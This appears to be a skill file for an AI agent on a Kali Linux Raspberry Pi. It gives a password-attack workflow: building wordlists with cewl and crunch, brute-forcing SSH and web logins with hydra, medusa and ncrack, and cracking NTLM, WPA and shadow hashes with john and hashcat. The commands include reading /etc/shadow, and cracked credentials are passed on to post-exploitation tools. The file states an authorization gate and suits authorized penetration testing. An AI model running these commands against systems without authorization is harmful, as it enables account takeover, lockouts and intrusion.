---
name: kali-password-attacks
description: "Kali menu 05 — Password Attacks. Compound workflow that builds custom wordlists (cewl, crunch), runs online credential attacks (hydra, medusa, ncrack) and offline hash cracking (john, hashcat) against authorized targets and captured hashes. Use when the user wants to crack passwords/hashes, build a wordlist, spray or brute-force a login they are authorized to test."
---

# Password Attacks (Kali 05)

Goal: recover credentials — either online against a live service, or offline against captured
hashes — using targeted wordlists before brute force.

## Authorization gate
Only against systems/hashes the user owns or is authorized to test. Online brute force can
lock accounts and trip alerts; confirm lockout policy and get sign-off first.

## Phase 1 — Build a targeted wordlist (beats raw brute force)
```
cewl -d 2 -m 5 -w site_words.txt http://<target>          # scrape words from the org's site
crunch 8 8 -t Pass@%%% -o crunch.txt                      # pattern-based candidates
gunzip -k /usr/share/wordlists/rockyou.txt.gz             # the classic base list
```
SecLists is installed at `/usr/share/seclists/` — richer, categorized lists, e.g.
`Passwords/Leaked-Databases/rockyou.txt`, `Passwords/Common-Credentials/10k-most-common.txt`,
`Usernames/top-usernames-shortlist.txt`, `Discovery/Web-Content/` (for kali-web-analysis).
Mangle with rules at crack time (hashcat `-r`, john `--rules`) instead of pre-expanding on disk.

## Phase 2 — Online attacks (live service)
```
hydra -L users.txt -P rockyou.txt ssh://<target> -t 4 -V
hydra -l admin -P pass.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
medusa -h <target> -u admin -P pass.txt -M ssh
ncrack -p 22 --user admin -P pass.txt <target>
```
Keep threads low (`-t 4`) on the Pi and to avoid lockouts. `-V` shows each attempt.

## Phase 3 — Identify the hash (offline)
```
hashid '<hash>'                                            # guess hash type
# or look up the hashcat mode number:  hashcat --example-hashes | less
```

## Phase 4 — Offline cracking
John (auto-detects many formats, good first pass):
```
john --wordlist=rockyou.txt hashes.txt
john --show hashes.txt
john --incremental hashes.txt                              # brute when wordlist fails
```
Hashcat (faster where accelerated; mode `-m` must match the hash):
```
hashcat -m 0    -a 0 hashes.txt rockyou.txt                # MD5 + wordlist
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 22000 -a 0 wifi.hc22000 rockyou.txt             # WPA (from kali-wireless)
hashcat -m 1800 -a 3 shadow.txt '?l?l?l?l?d?d'             # mask/brute
```
Common modes: 0 MD5, 100 SHA1, 1000 NTLM, 1800 sha512crypt, 3200 bcrypt, 13100 Kerberos TGS, 22000 WPA.

## Output and handoff
Record cracked `user:password` pairs, the source hash type, and method (wordlist+rule vs mask).
Feed recovered creds back into **kali-post-exploitation** (netexec, evil-winrm) or
**kali-db-assessment**.

## Gotchas
- The Pi 4 has no crackable GPU — hashcat runs on CPU and is slow; prefer small lists + rules.
- Match `-m` exactly or hashcat silently "cracks" nothing. Verify with `--example-hashes`.
- Extract OS hashes legitimately: `unshadow /etc/passwd /etc/shadow > shadow.txt` (needs the files).
- Save state: hashcat `--restore`, john resumes automatically from its `.rec` pot.
